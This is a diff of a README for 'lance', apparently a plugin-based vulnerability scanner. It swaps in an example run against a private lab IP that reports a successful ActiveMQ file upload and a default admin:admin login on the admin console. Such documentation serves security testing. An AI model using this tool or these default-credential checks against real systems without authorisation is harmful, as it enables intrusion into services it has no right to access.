@@ -58,18 +58,16 @@ python -u <ip or url> -m <poc or exp>
 e.g.
 
 ```
-root@ubuntu:~/lance# python3 lance.py -u "192.168.27.128"
-[*] Target url: http://192.168.27.128
-[*] Plugin path: /root/lance/plugins 
-[*] Loading plugin: activemq_putfile
-[+] ActiveMQ put file success
-[*] Loading plugin: activemq_movefile
-[-] Not Vulnerable activemq_movefile 
-[*] Loading plugin: weblogic_weakpasswd
-[!] ConnectionError 
-[*] Loading plugin: elasticSearch_dir_traversal
-[!] ConnectionError 
-[*] Loading plugin: weblogic_xmldecoder
-[!] ConnectionError 
-[*] Finished
+root@kali:~/lance# python3 lance.py -u 192.168.27.128 -m activemq
+[06:17:03] [*] Target url: http://192.168.27.128
+[06:17:03] [*] Plugin path: /root/lance/plugins 
+[06:17:03] [*] Loading activemq plugins.
+[06:17:03] [*] Loading plugin: activemq_putfile
+[06:17:03] [+] ActiveMQ put file success
+[06:17:03] [*] Loading plugin: activemq_movefile
+[06:17:03] [-] Not Vulnerable activemq_movefile 
+[06:17:03] [*] Loading plugin: activemq_weakpwd
+[06:17:03] [+] ActiveMQ weak password!  http://192.168.27.128:8161/admin/   username:admin, pwd:admin
+[06:17:03] [*] Finished
+root@kali:~/lance#
 ```
